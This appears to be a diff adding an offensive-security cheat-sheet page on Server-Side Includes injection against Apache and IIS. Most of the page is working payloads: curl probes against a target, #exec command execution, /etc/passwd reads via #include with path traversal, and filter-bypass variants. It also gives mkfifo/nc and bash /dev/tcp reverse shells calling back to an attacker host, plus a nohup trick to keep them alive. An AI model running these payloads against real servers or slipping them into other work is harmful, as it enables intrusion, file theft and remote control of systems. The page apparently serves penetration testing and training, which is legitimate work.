@@ -1,0 +1,249 @@
+---
+title: SSI Injection
+description: Server-Side Includes injection - directive catalog, detection methodology, RCE via mod_include #exec.
+mitre: [T1190, T1505.003, T1059]
+d3fend: [D3-MH, D3-ACH, D3-PSA]
+impact: [RCE, ServerSideEval]
+owasp: [A05]
+sidebar:
+  order: 1
+  label: SSI Injection
+---
+import { Aside, Tabs, TabItem } from '@astrojs/starlight/components';
+
+## TL;DR
+
+Apache's `mod_include` (and IIS equivalents) parses HTML files for `<!--#... -->` directives at serve time. When user input lands in such a file *and* SSI is enabled for that file extension, you can inject directives that execute commands, include files, or print environment variables.
+
+```html
+<!--#echo var="DATE_LOCAL" -->                              <!-- detection -->
+<!--#printenv -->                                            <!-- env dump -->
+<!--#exec cmd="id" -->                                       <!-- RCE -->
+<!--#include virtual="/etc/passwd" -->                       <!-- file read (limited) -->
+```
+
+Success indicator: the directive is replaced by its output instead of being rendered as a comment.
+
+## Where to look
+
+Three conditions for SSI exploitation:
+
+1. **The file extension is configured for SSI parsing.** Default Apache: `.shtml`, `.shtm`, `.stm`. Non-default configs sometimes enable SSI on `.html`.
+2. **User input ends up inside the served file.** Either persisted (saved to disk and served back) or reflected (template that bakes input into output).
+3. **The output is fetched back through Apache** (not as a static download; it has to go through `mod_include`).
+
+Common targets: feedback forms, profile bios, comment systems, file-upload features that store user content in a docroot directory served by Apache, error pages that include the requested URL.
+
+## Directive reference
+
+```html
+<!-- Print local time -->
+<!--#echo var="DATE_LOCAL" -->
+
+<!-- Print environment variables -->
+<!--#printenv -->
+<!--#echo var="HTTP_USER_AGENT" -->
+<!--#echo var="DOCUMENT_ROOT" -->
+<!--#echo var="REMOTE_ADDR" -->
+
+<!-- File modification time -->
+<!--#flastmod file="index.html" -->
+
+<!-- Include another file (relative to document) -->
+<!--#include file="header.html" -->
+
+<!-- Include another URL (relative to docroot) -->
+<!--#include virtual="/footer.html" -->
+
+<!-- CGI execution -->
+<!--#include virtual="/cgi-bin/script.pl" -->
+
+<!-- Direct command execution -->
+<!--#exec cmd="id" -->
+<!--#exec cmd="ls -la /" -->
+
+<!-- Set variables -->
+<!--#set var="x" value="hello" -->
+<!--#echo var="x" -->
+
+<!-- Configuration -->
+<!--#config errmsg="custom error" -->
+<!--#config timefmt="%Y-%m-%d" -->
+```
+
+## Detection
+
+### Step 1 - Probe with a benign directive
+
+Submit `<!--#echo var="DATE_LOCAL" -->` into any input that gets reflected. If the response shows a date instead of the literal directive, SSI is parsing your input.
+
+```bash
+curl -X POST -d 'name=<!--#echo var="DATE_LOCAL" -->' http://<TARGET>/profile
+```
+
+Look for behavior like:
+
+- Input field shows: `Saturday, 04-May-2024 10:30:00 EDT` instead of the comment
+- Comments stripped from output (mod_include consumed them)
+- Response time changes (directive evaluation takes longer)
+
+### Step 2 - Confirm with `<!--#printenv -->`
+
+```bash
+curl -X POST -d 'name=<!--#printenv -->' http://<TARGET>/profile
+```
+
+If environment variables appear (`HTTP_HOST`, `SERVER_SOFTWARE`, `DOCUMENT_ROOT`, `REMOTE_ADDR`, etc.), SSI is fully active.
+
+### Step 3 - Test for `#exec`
+
+```bash
+curl -X POST -d 'name=<!--#exec cmd="id" -->' http://<TARGET>/profile
+```
+
+`#exec` is sometimes disabled (`Options +Includes` allows directives but excludes `IncludesNOEXEC` blocks `#exec`). If `#echo` works but `#exec` returns the literal text or an error, you have file inclusion only - no RCE.
+
+## File extension tricks
+
+The biggest constraint on SSI is the file extension. The user input must end up in a file Apache parses for SSI.
+
+### When the app saves input as `.shtml`
+
+Direct path: input goes into a `.shtml` file, Apache parses it on serve.
+
+### When the app saves input as `.html`
+
+Some non-default configs enable SSI on `.html`:
+
+```apache
+AddType text/html .html
+AddOutputFilter INCLUDES .html
+```
+
+Test by reading the response headers (`Content-Type`, sometimes a `X-Powered-By`) - if SSI is generic-on, the directive will be parsed.
+
+### When the app sanitizes the input file extension but lets you choose
+
+If you can upload files with chosen extensions:
+
+```bash
+# Upload as .shtml - gets parsed when served back
+upload: payload.shtml
+content: <html><body><!--#exec cmd="id" --></body></html>
+```
+
+### Trailing-newline trick
+
+Apache (and SSI) requires the directive to be on a complete line ending in newline. Some sanitizers strip trailing whitespace or newline. Pad with extra characters:
+
+```html
+<!--#exec cmd="id" -->
+                                        (trailing space + newline preserved)
+```
+
+## RCE via `#exec`
+
+When `#exec` is enabled:
+
+```html
+<!--#exec cmd="id" -->
+<!--#exec cmd="cat /etc/passwd" -->
+<!--#exec cmd="ls -la /var/www" -->
+```
+
+Output is inlined into the response where the directive was. Multi-line output appears multi-line.
+
+### Reverse shell
+
+When `#exec` is enabled but you can't get a TTY-style interactive shell directly:
+
+```html
+<!--#exec cmd="mkfifo /tmp/f;nc <LHOST> <LPORT> 0</tmp/f|/bin/bash 1>/tmp/f;rm /tmp/f" -->
+```
+
+Listener:
+
+```bash
+nc -lvnp <LPORT>
+```
+
+Why the FIFO trick: many distro `nc` builds (notably OpenBSD-netcat on Debian) don't ship with `-e`. The mkfifo construction reads from the FIFO into a shell, pipes shell output back through nc - bidirectional connection without `-e`.
+
+If `bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1` works, prefer it (cleaner, no FIFO file left behind):
+
+```html
+<!--#exec cmd="bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'" -->
+```
+
+## File inclusion via `#include`
+
+When `#exec` is disabled but `#include` works:
+
+```html
+<!--#include virtual="/etc/passwd" -->
+<!--#include file="../../../etc/passwd" -->
+```
+
+`virtual="/path"` is relative to docroot; `file="path"` is relative to the file being parsed.
+
+Path traversal works for `file=`:
+
+```html
+<!--#include file="../../../../etc/passwd" -->
+```
+
+For `virtual=`, traversal is restricted but cross-app inclusion is possible:
+
+```html
+<!--#include virtual="/admin/secret-page.html" -->
+```
+
+If the admin page is accessible only from localhost via mod-include, and your input file is served externally, you've crossed an access-control boundary.
+
+### CGI invocation via `#include virtual`
+
+```html
+<!--#include virtual="/cgi-bin/test.pl" -->
+```
+
+Re-invokes a CGI script from within mod_include's parser. Sometimes useful for accessing CGI scripts that aren't directly exposed.
+
+## Filter bypass
+
+Sanitizers commonly block `<!--#`. Variants that sometimes survive:
+
+```html
+<!--   #exec cmd="id" -->                       <!-- extra spaces -->
+<!--#EXEC cmd="id" -->                          <!-- case (rarely matters) -->
+<!--   #include virtual="/etc/passwd" -->
+```
+
+If `<!--` is filtered entirely, SSI is not exploitable - there's no other way to start a directive.
+
+If specific directives are filtered (`exec`), `<!--#include virtual="/cgi-bin/anything"-->` may still work if a CGI is reachable.
+
+## IIS-style SSI
+
+IIS supports a similar feature, with Windows-specific commands:
+
+```html
+<!--#exec cmd="dir C:\" -->
+<!--#exec cmd="type C:\Users\Administrator\Desktop\flag.txt" -->
+```
+
+The `cmd` argument runs through cmd.exe, so cmd-style chaining (`&`, `&&`) and Windows path syntax apply.
+
+## Common failure modes
+
+- **Directive appears literally in output.** SSI not enabled for this file extension. Check `Content-Type` - if `text/html` and the file has `.html` extension, SSI is probably off. Look for upload features where you can choose `.shtml`.
+- **`#echo` works but `#exec` returns nothing.** `IncludesNOEXEC` set in Apache config - file inclusion enabled, command execution disabled. Limited but useful (file disclosure, env vars).
+- **Directive consumed but no output.** mod_include parsed it and produced empty output (e.g., `#config` directives produce no output). Try `#echo` or `#exec` for visible output.
+- **Reverse shell connects but dies immediately.** Apache's child process is short-lived; the shell forks but the parent process exits quickly. Detach: `<!--#exec cmd="(nohup bash -c '...' &) > /dev/null 2>&1" -->`.
+- **Some directives blocked, others allowed.** Custom mod_include filter or WAF in path. Pivot to whichever directive isn't blocked - `#include` for file disclosure, `#echo` for env exfil.
+- **Input length limit too short for full directive.** Multi-stage inject: write directive across multiple inputs that get concatenated, or use a shorter directive form.
+
+## Notes
+
+SSI is a legacy technology - most modern stacks (Node, Go, modern PHP frameworks) don't use it. The bug class persists because: (1) Apache's default config still ships SSI support, (2) `.shtml` files exist in the wild from old codebases, (3) some shared hosting providers leave SSI on by default. When you find SSI exploitation in 2025+, it's usually a vintage codebase or a misconfigured shared-hosting deployment.
+
+Where SSI does work, it's a fast path to RCE: detect with `<!--#printenv -->`, escalate with `<!--#exec cmd="id" -->`. The whole chain takes minutes if the conditions align.
